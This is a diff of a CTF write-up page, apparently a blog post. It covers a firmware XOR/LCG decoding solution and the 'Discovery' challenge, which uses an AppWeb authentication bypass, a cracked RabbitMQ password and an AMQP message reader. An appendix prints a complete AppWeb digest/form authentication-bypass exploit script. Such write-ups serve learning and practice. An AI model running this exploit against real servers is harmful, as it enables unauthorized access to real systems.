+</span></span><span style=display:flex><span><span style=color:#75715e># The LCG algorithm used to generate the XOR keys</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>lcg</span>():
+</span></span><span style=display:flex><span>    seed <span style=color:#f92672>=</span> c_uint(<span style=color:#ae81ff>0x2e9d3</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#ae81ff>1</span>:
+</span></span><span style=display:flex><span>        seed <span style=color:#f92672>=</span> c_uint(seed<span style=color:#f92672>.</span>value <span style=color:#f92672>*</span> <span style=color:#ae81ff>0x303577d</span> <span style=color:#f92672>+</span> <span style=color:#ae81ff>0x145a</span>)
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>yield</span> seed<span style=color:#f92672>.</span>value <span style=color:#f92672>%</span> <span style=color:#ae81ff>0xff</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>ciphertext <span style=color:#f92672>=</span> bytearray()
+</span></span><span style=display:flex><span><span style=color:#75715e># Reversing what&#39;s being done in the firmware</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0</span>, len(bits_list), <span style=color:#ae81ff>2</span>):
+</span></span><span style=display:flex><span>    c1, c2 <span style=color:#f92672>=</span> int(bits_list[i][<span style=color:#ae81ff>1</span>:<span style=color:#ae81ff>6</span>], <span style=color:#ae81ff>2</span>) , int(bits_list[i<span style=color:#f92672>+</span><span style=color:#ae81ff>1</span>][<span style=color:#ae81ff>1</span>:<span style=color:#ae81ff>6</span>], <span style=color:#ae81ff>2</span>)
+</span></span><span style=display:flex><span>    x1, x2 <span style=color:#f92672>=</span> c1<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, c2<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>
+</span></span><span style=display:flex><span>    b <span style=color:#f92672>=</span> (x1 <span style=color:#f92672>&lt;&lt;</span> <span style=color:#ae81ff>4</span>) <span style=color:#f92672>+</span> x2
+</span></span><span style=display:flex><span>    ciphertext<span style=color:#f92672>.</span>append(b)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># The XOR and flag</span>
+</span></span><span style=display:flex><span>L <span style=color:#f92672>=</span> lcg()
+</span></span><span style=display:flex><span>xor_key <span style=color:#f92672>=</span> bytearray([next(L) <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> ciphertext])
+</span></span><span style=display:flex><span>plaintext <span style=color:#f92672>=</span> xor(xor_key, ciphertext)
+</span></span><span style=display:flex><span>print(plaintext<span style=color:#f92672>.</span>decode())
+</span></span></code></pre></div><p>And just like that, we get our flag!
+<code>CHTB{10w_13v31_f12mw4235_741ks_70_h42dw423_!@3418}</code></p><h3 id=discovery>Discovery</h3><img src=media/DiscoveryDescription.png alt="Challenge info for Discovery" loading=lazy><p>This challenge was certainly challenging. I never got to solve it during the competition period, however, upon looking at solutions, this one is a very fun one to explore (fun is not guaranteed).</p><p>Unlike the other hardware challenges, this not only didn&rsquo;t involve Saleae, but also had not just one, but two docker instances we could connect to. The URL and port is different for everyone, but what lies beyond is the same. We are given to IPs:</p><ul><li>One is an AppWeb panel (and asks us for a username or password)</li><li>The other is an AMQP server (although we can&rsquo;t connect through a web browser, the response headers tell us that it&rsquo;s using the AMQP protocol)</li></ul><p>Despite a lot of begging and pleading, there didn&rsquo;t seem to be any way past the authentication on the AppWeb panel.</p><p>As it turns out, the entirety of the authentication can by bypassed given that we know the username. A step by step walkthrough of how it works can be found <a href=https://lab.wallarm.com/can-your-printer-hack-your-secrets-appweb-authorization-bypass-c609cf9024a7/ target=_blank rel=noreferrer>here</a>
 and the exploit script with a basic description behind the CVE can be seen <a href=https://vulners.com/seebug/SSV:97181 target=_blank rel=noreferrer>here</a>
 .
 But to summarise the issue, whilst the username and password is checked when the authentication type is set to &ldquo;basic&rdquo;, if the http headers being sent to the server had the authentication type changed to either &ldquo;digest&rdquo; or &ldquo;form&rdquo;, only the username is checked. Using this exploit (with the help of an <a href=#python-3-ified-exploit-script-to-bypass-authentication target=_blank rel=noreferrer>exploit script</a>
-) and guessing that the username was &ldquo;admin&rdquo; (because why wouldn&rsquo;t you have that as the username), we finally get access to the AppWeb panel.</p>
-<img src=media/DiscoveryLoggedIn.png alt="Logged in screen with password hashes" loading=lazy>
-<p>Now, we&rsquo;re greeted with a few things of note. Within the RabbitMQ access table, there are 2 entries:</p>
-<ul>
-<li>anthony_davis (with password hash <code>89D9743B793B22AEB9A8142ABD59FDF4CDABFDD01796C31BE7587C114E0D37C1</code>)</li>
-<li>leo (with password hash <code>27BE4E31517E61D2BEF777B7293B7D8C73C14BD1B8F2839A7B8226CBEFF30E99</code>)</li>
-</ul>
-<p>Throwing both of these password hashes into crackstation, we get a hit with anthony_davis' hash (password = <code>winniethepooh</code>).<br>
-On top of the password hashes, we&rsquo;re told that leo will be exchanging messages using the &ldquo;topic&rdquo; exchange type. This will be very important information shortly.</p>
-<p>Now armed with RabbitMQ credentials, let&rsquo;s get started with AMQP.
+) and guessing that the username was &ldquo;admin&rdquo; (because why wouldn&rsquo;t you have that as the username), we finally get access to the AppWeb panel.</p><img src=media/DiscoveryLoggedIn.png alt="Logged in screen with password hashes" loading=lazy><p>Now, we&rsquo;re greeted with a few things of note. Within the RabbitMQ access table, there are 2 entries:</p><ul><li>anthony_davis (with password hash <code>89D9743B793B22AEB9A8142ABD59FDF4CDABFDD01796C31BE7587C114E0D37C1</code>)</li><li>leo (with password hash <code>27BE4E31517E61D2BEF777B7293B7D8C73C14BD1B8F2839A7B8226CBEFF30E99</code>)</li></ul><p>Throwing both of these password hashes into crackstation, we get a hit with anthony_davis&rsquo; hash (password = <code>winniethepooh</code>).<br>On top of the password hashes, we&rsquo;re told that leo will be exchanging messages using the &ldquo;topic&rdquo; exchange type. This will be very important information shortly.</p><p>Now armed with RabbitMQ credentials, let&rsquo;s get started with AMQP.
 AMQP (Advanced Message Queuing Protocol) is a messaging protocol, that allows for sending and receiving of messages with the use of queues. RabbitMQ is just an (open source) implementation of the protocol. <a href=https://www.rabbitmq.com/tutorials/tutorial-one-python.html target=_blank rel=noreferrer>Here</a>
-is a great tutorial going over RabbitMQ. But for now we only need to know a few things:</p>
-<ul>
-<li>RabbitMQ acts as a &ldquo;broker&rdquo;, something that takes the message from a sender, and gives it to the receiver via a queue.</li>
-<li>Because the exchange type is topic, we (the receiver) can only retrieve messages of a certain topic.</li>
-</ul>
-<p>Here is the code I used, with some description of what is happening:</p>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> pika
-<span style=color:#75715e># Connect to AMQP</span>
-amqp_IP <span style=color:#f92672>=</span> <span style=color:#75715e># IP address of the AMQP server</span>
-parameter <span style=color:#f92672>=</span> pika<span style=color:#f92672>.</span>URLParameters(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;amqp://anthony_davis:winniethepooh@</span><span style=color:#e6db74>{</span>amqp_IP<span style=color:#e6db74>}</span><span style=color:#e6db74>/%2f&#39;</span>)
-connection <span style=color:#f92672>=</span> pika<span style=color:#f92672>.</span>BlockingConnection(parameter)
-
-<span style=color:#75715e># Open channel and declares type of exchange (based on info on web portal)</span>
-channel <span style=color:#f92672>=</span> connection<span style=color:#f92672>.</span>channel()
-channel<span style=color:#f92672>.</span>exchange_declare(exchange<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Base&#34;</span>, exchange_type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;topic&#34;</span>)
-
-<span style=color:#75715e># Creates a queue, and name is auto generated by RabbitMQ (empty string tells the broker to do the naming for us)</span>
-result <span style=color:#f92672>=</span> channel<span style=color:#f92672>.</span>queue_declare(queue<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>)
-queue_name <span style=color:#f92672>=</span> result<span style=color:#f92672>.</span>method<span style=color:#f92672>.</span>queue
-
-<span style=color:#75715e># bind queue to exchange - essentially tells RabbitMQ where to send the messages to</span>
-<span style=color:#75715e># the &#39;#&#39; acts as a wild card (match 0 or more words), unlike &#39;*&#39; (which is just match 1 word)</span>
-channel<span style=color:#f92672>.</span>queue_bind(exchange <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Base&#34;</span>, queue <span style=color:#f92672>=</span> queue_name, routing_key<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;#&#39;</span>)
-
-<span style=color:#75715e># what to do when messages are received - just print the body of the messages</span>
-<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>callback</span>(ch, method, properties, body):
-    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;&gt;&gt; </span><span style=color:#e6db74>{</span>body<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
-
-<span style=color:#75715e># start the message receiving</span>
-channel<span style=color:#f92672>.</span>basic_consume(queue <span style=color:#f92672>=</span> queue_name, on_message_callback<span style=color:#f92672>=</span>callback, auto_ack <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>)
-channel<span style=color:#f92672>.</span>start_consuming()
-</code></pre></div><p>Running the script, we get some outputs, and finally, the flag!
+is a great tutorial going over RabbitMQ. But for now we only need to know a few things:</p><ul><li>RabbitMQ acts as a &ldquo;broker&rdquo;, something that takes the message from a sender, and gives it to the receiver via a queue.</li><li>Because the exchange type is topic, we (the receiver) can only retrieve messages of a certain topic.</li></ul><p>Here is the code I used, with some description of what is happening:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> pika
+</span></span><span style=display:flex><span><span style=color:#75715e># Connect to AMQP</span>
+</span></span><span style=display:flex><span>amqp_IP <span style=color:#f92672>=</span> <span style=color:#75715e># IP address of the AMQP server</span>
+</span></span><span style=display:flex><span>parameter <span style=color:#f92672>=</span> pika<span style=color:#f92672>.</span>URLParameters(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;amqp://anthony_davis:winniethepooh@</span><span style=color:#e6db74>{</span>amqp_IP<span style=color:#e6db74>}</span><span style=color:#e6db74>/%2f&#39;</span>)
+</span></span><span style=display:flex><span>connection <span style=color:#f92672>=</span> pika<span style=color:#f92672>.</span>BlockingConnection(parameter)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Open channel and declares type of exchange (based on info on web portal)</span>
+</span></span><span style=display:flex><span>channel <span style=color:#f92672>=</span> connection<span style=color:#f92672>.</span>channel()
+</span></span><span style=display:flex><span>channel<span style=color:#f92672>.</span>exchange_declare(exchange<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Base&#34;</span>, exchange_type<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;topic&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># Creates a queue, and name is auto generated by RabbitMQ (empty string tells the broker to do the naming for us)</span>
+</span></span><span style=display:flex><span>result <span style=color:#f92672>=</span> channel<span style=color:#f92672>.</span>queue_declare(queue<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>)
+</span></span><span style=display:flex><span>queue_name <span style=color:#f92672>=</span> result<span style=color:#f92672>.</span>method<span style=color:#f92672>.</span>queue
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># bind queue to exchange - essentially tells RabbitMQ where to send the messages to</span>
+</span></span><span style=display:flex><span><span style=color:#75715e># the &#39;#&#39; acts as a wild card (match 0 or more words), unlike &#39;*&#39; (which is just match 1 word)</span>
+</span></span><span style=display:flex><span>channel<span style=color:#f92672>.</span>queue_bind(exchange <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;Base&#34;</span>, queue <span style=color:#f92672>=</span> queue_name, routing_key<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;#&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># what to do when messages are received - just print the body of the messages</span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>callback</span>(ch, method, properties, body):
+</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;&gt;&gt; </span><span style=color:#e6db74>{</span>body<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#75715e># start the message receiving</span>
+</span></span><span style=display:flex><span>channel<span style=color:#f92672>.</span>basic_consume(queue <span style=color:#f92672>=</span> queue_name, on_message_callback<span style=color:#f92672>=</span>callback, auto_ack <span style=color:#f92672>=</span> <span style=color:#66d9ef>True</span>)
+</span></span><span style=display:flex><span>channel<span style=color:#f92672>.</span>start_consuming()
+</span></span></code></pre></div><p>Running the script, we get some outputs, and finally, the flag!
 <img src=media/DiscoveryFlag.png alt="Flag is revealed" loading=lazy>
-<code>CHTB{1_h4v3_n0_n4m3_@_@}</code></p>
-<h2 id=extras>Extras</h2>
-<h3 id=theres-an-imposter-among-us>There&rsquo;s an imposter among us</h3>
-<p>Whilst debugging some issues with the bit mapping in <a href=#off-the-grid target=_blank rel=noreferrer>Off The Grid</a>
+<code>CHTB{1_h4v3_n0_n4m3_@_@}</code></p><h2 id=extras>Extras</h2><h3 id=theres-an-imposter-among-us>There&rsquo;s an imposter among us</h3><p>Whilst debugging some issues with the bit mapping in <a href=#off-the-grid target=_blank rel=noreferrer>Off The Grid</a>
 , I encountered something very suspicious&mldr;
-<img src=media/OffTheGridImposter.png alt="Sus amongus figure accidentally appears" loading=lazy>
-</p>
-<h3 id=python-3-ified-exploit-script-to-bypass-authentication>Python 3-ified exploit script to bypass authentication</h3>
-<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> requests
-<span style=color:#f92672>import</span> argparse
-
-print (<span style=color:#e6db74>&#34;&#34;&#34;----------------------------------------------------------------
-</span><span style=color:#e6db74>Embedthis Appweb/Http Zero-Day Form/Digest Authentication Bypass
-</span><span style=color:#e6db74>----------------------------------------------------------------
-</span><span style=color:#e6db74>&#34;&#34;&#34;</span>)
-
-<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>test_digest</span>(r):
-    auth <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;realm&#34;</span>, <span style=color:#e6db74>&#34;domain&#34;</span>, <span style=color:#e6db74>&#34;qop&#34;</span>, <span style=color:#e6db74>&#34;nonce&#34;</span>, <span style=color:#e6db74>&#34;opaque&#34;</span>, <span style=color:#e6db74>&#34;algorithm&#34;</span>, <span style=color:#e6db74>&#34;stale&#34;</span>, <span style=color:#e6db74>&#34;MD5&#34;</span>, <span style=color:#e6db74>&#34;FALSE&#34;</span>, <span style=color:#e6db74>&#34;Digest&#34;</span>]
-    wwwauthenticate <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;WWW-Authenticate&#39;</span>)
-
-    <span style=color:#66d9ef>if</span> wwwauthenticate <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
-        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
-
-    <span style=color:#66d9ef>for</span> k <span style=color:#f92672>in</span> auth:
-        <span style=color:#66d9ef>if</span> k <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> wwwauthenticate:
-            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
-
-    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
-
-
-<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>test_form</span>(r):
-    <span style=color:#e6db74>&#34;&#34;&#34; extremely shoddy recognition, expect false positives &#34;&#34;&#34;</span>
-
-    auth <span style=color:#f92672>=</span> [(<span style=color:#e6db74>&#34;X-XSS-Protection&#34;</span>, <span style=color:#e6db74>&#34;1; mode=block&#34;</span>), (<span style=color:#e6db74>&#34;X-Content-Type-Options&#34;</span>, <span style=color:#e6db74>&#34;nosniff&#34;</span>), (<span style=color:#e6db74>&#34;ETag&#34;</span>, <span style=color:#66d9ef>None</span>), (<span style=color:#e6db74>&#34;Date&#34;</span>, <span style=color:#66d9ef>None</span>)]
-    potential_auth <span style=color:#f92672>=</span> [(<span style=color:#e6db74>&#34;Last Modified&#34;</span>, <span style=color:#e6db74>&#34;&#34;</span>), (<span style=color:#e6db74>&#34;X-Frame-Options&#34;</span>, <span style=color:#e6db74>&#34;SAMEORIGIN&#34;</span>), (<span style=color:#e6db74>&#34;Accept-Ranges&#34;</span>, <span style=color:#e6db74>&#34;bytes&#34;</span>), (<span style=color:#e6db74>&#34;Content-Type&#34;</span>, <span style=color:#e6db74>&#34;text/html&#34;</span>)]
-
-    <span style=color:#66d9ef>if</span> r<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;WWW-Authenticate&#34;</span>) <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span>:
-        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
-
-    <span style=color:#66d9ef>for</span> k, v <span style=color:#f92672>in</span> auth:
-        rv <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(k)
-        <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> rv:
-            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
-        <span style=color:#66d9ef>if</span> v <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span> <span style=color:#f92672>and</span> v <span style=color:#f92672>!=</span> rv:
-            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
-
-    potential_count <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
-    <span style=color:#66d9ef>for</span> k, v <span style=color:#f92672>in</span> potential_auth:
-        rv <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(k)
-        <span style=color:#66d9ef>if</span> rv <span style=color:#f92672>and</span> v <span style=color:#f92672>!=</span> <span style=color:#e6db74>&#34;&#34;</span> <span style=color:#f92672>and</span> v <span style=color:#f92672>==</span> rv:
-            potential_count <span style=color:#f92672>+=</span> <span style=color:#ae81ff>1</span>
-
-    print(<span style=color:#e6db74>&#34;[+] Optional matchings: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>/</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(potential_count, len(potential_auth)))
-    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
-
-
-<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>test</span>(url):
-    <span style=color:#e6db74>&#34;&#34;&#34; Newer EmbedThis HTTP Library/Appweb versions do not advertise their presence in headers, sometimes might be proxied by nginx/apache, we can only look for a default headers configuration &#34;&#34;&#34;</span>
-
-    r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url)
-
-    <span style=color:#75715e># EmbedThis GoAhead uses a similar headers configuration, let&#39;s skip it explicitly</span>
-    serv <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#34;Server&#34;</span>)
-    <span style=color:#66d9ef>if</span> serv <span style=color:#f92672>and</span> <span style=color:#e6db74>&#34;GoAhead&#34;</span> <span style=color:#f92672>in</span> serv:
-        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
-
-    <span style=color:#66d9ef>if</span> test_digest(r):
-        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;digest&#34;</span>
-    <span style=color:#66d9ef>elif</span> test_form(r):
-        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;form&#34;</span>
-    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>None</span>
-
-
-<span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exploit</span>(url, username<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;joshua&#34;</span>, authtype<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;digest&#34;</span>):
-    payload <span style=color:#f92672>=</span> { <span style=color:#e6db74>&#34;username&#34;</span>: username }
-
-    headers <span style=color:#f92672>=</span> {
-        <span style=color:#e6db74>&#34;authorization&#34;</span>: <span style=color:#e6db74>&#34;Digest username=</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(username),
-        <span style=color:#e6db74>&#34;user-agent&#34;</span>: <span style=color:#e6db74>&#34;TruelBot&#34;</span>,
-        <span style=color:#e6db74>&#34;content-type&#34;</span>: <span style=color:#e6db74>&#34;application/x-www-form-urlencoded&#34;</span>,
-    }
-
-    <span style=color:#66d9ef>if</span> authtype <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;digest&#34;</span>:
-        r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url, data<span style=color:#f92672>=</span>payload, headers<span style=color:#f92672>=</span>headers)
-    <span style=color:#66d9ef>else</span>:
-        r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url, data<span style=color:#f92672>=</span>payload, headers<span style=color:#f92672>=</span>headers)
-
-    print(r<span style=color:#f92672>.</span>content)
-
-    <span style=color:#66d9ef>if</span> r<span style=color:#f92672>.</span>status_code <span style=color:#f92672>!=</span> <span style=color:#ae81ff>200</span> <span style=color:#f92672>or</span> len(r<span style=color:#f92672>.</span>cookies) <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1</span>:
-        print(<span style=color:#e6db74>&#34;[!] Exploit failed, HTTP status code </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(r<span style=color:#f92672>.</span>status_code))
-        <span style=color:#66d9ef>return</span>
-
-    print(<span style=color:#e6db74>&#34;[*] Succesfully exploited, here&#39;s your c00kie:</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>  </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(dict(r<span style=color:#f92672>.</span>cookies))
-
-)
-<span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#34;__main__&#34;</span>:
-    parser <span style=color:#f92672>=</span> argparse<span style=color:#f92672>.</span>ArgumentParser(description<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;Test&amp;Exploit EmbedThis form/digest authentication bypass (CVE-XXXX-YYYY)&#34;</span>)
-    parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;-t&#39;</span>, <span style=color:#e6db74>&#39;--target&#39;</span>, required<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;specify the target url (i.e., http(s)://target-url[:port]/)&#34;</span>)
-    parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;-u&#39;</span>, <span style=color:#e6db74>&#39;--user&#39;</span>, required<span style=color:#f92672>=</span><span style=color:#66d9ef>True</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;you need to know a valid user name&#34;</span>)
-    parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;-c&#39;</span>, <span style=color:#e6db74>&#39;--check&#39;</span>, action<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;store_true&#39;</span>, default<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;test for exploitability without running the actual exploit&#34;</span>)
-    parser<span style=color:#f92672>.</span>add_argument(<span style=color:#e6db74>&#39;-f&#39;</span>, <span style=color:#e6db74>&#39;--force&#39;</span>, action<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;store_true&#39;</span>, default<span style=color:#f92672>=</span><span style=color:#66d9ef>False</span>, help<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;skip exploitability test&#34;</span>)
-    args <span style=color:#f92672>=</span> parser<span style=color:#f92672>.</span>parse_args()
-
-    url <span style=color:#f92672>=</span> args<span style=color:#f92672>.</span>target
-    username <span style=color:#f92672>=</span> args<span style=color:#f92672>.</span>user
-    t <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;form&#34;</span> <span style=color:#75715e># default will try form/post</span>
-    <span style=color:#66d9ef>if</span> args<span style=color:#f92672>.</span>check <span style=color:#f92672>or</span> <span style=color:#f92672>not</span> args<span style=color:#f92672>.</span>force:
-        t <span style=color:#f92672>=</span> test(url)
-
-    <span style=color:#66d9ef>if</span> t <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
-        print(<span style=color:#e6db74>&#34;[!] Target does not appear to be Appweb/Embedthis HTTP with form/post auth (force with -f)&#34;</span>)
-    <span style=color:#66d9ef>else</span>:
-        print(<span style=color:#e6db74>&#34;[+] Potential appweb/embedthis http, </span><span style=color:#e6db74>{}</span><span style=color:#e6db74> method&#34;</span><span style=color:#f92672>.</span>format(t))
-
-    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> args<span style=color:#f92672>.</span>check:
-        print(<span style=color:#e6db74>&#34;[!] Exploiting </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>, user </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>!&#34;</span><span style=color:#f92672>.</span>format(url, username))
-        exploit(url, username, t)
-</code></pre></div>
-</article>
-</main>
-</div>
-</body>
-</html>
+<img src=media/OffTheGridImposter.png alt="Sus amongus figure accidentally appears" loading=lazy></p><h3 id=python-3-ified-exploit-script-to-bypass-authentication>Python 3-ified exploit script to bypass authentication</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
+</span></span><span style=display:flex><span><span style=color:#f92672>import</span> argparse
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>print (<span style=color:#e6db74>&#34;&#34;&#34;----------------------------------------------------------------
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Embedthis Appweb/Http Zero-Day Form/Digest Authentication Bypass
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>----------------------------------------------------------------
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>test_digest</span>(r):
+</span></span><span style=display:flex><span>    auth <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;realm&#34;</span>, <span style=color:#e6db74>&#34;domain&#34;</span>, <span style=color:#e6db74>&#34;qop&#34;</span>, <span style=color:#e6db74>&#34;nonce&#34;</span>, <span style=color:#e6db74>&#34;opaque&#34;</span>, <span style=color:#e6db74>&#34;algorithm&#34;</span>, <span style=color:#e6db74>&#34;stale&#34;</span>, <span style=color:#e6db74>&#34;MD5&#34;</span>, <span style=color:#e6db74>&#34;FALSE&#34;</span>, <span style=color:#e6db74>&#34;Digest&#34;</span>]
+</span></span><span style=display:flex><span>    wwwauthenticate <span style=color:#f92672>=</span> r<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;WWW-Authenticate&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> wwwauthenticate <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> k <span style=color:#f92672>in</span> auth:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> k <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> wwwauthenticate:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>test_form</span>(r):
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34; extremely shoddy recognition, expect false positives &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    auth <span style=color:#f92672>=</span> [(<span style=color:#e6db74>&#34;X-XSS-Protection&#34;</span>, <span style=color:#e6db74>&#34;1; mode=block&#34;</span>), (<span style=color:#e6db74>&#34;X-Content-Type-Options&#34;</span>, <span style=color:#e6db74>&#34;nosniff&#34;</span>), (<span style=color:#e6db74>&#34;ETag&#34;</span>, <span style=color:#66d9ef>None</span>), (<span style=color:#e6db74>&#34;Date&#34;</span>, <span style=color:#66d9ef>None</span>)]
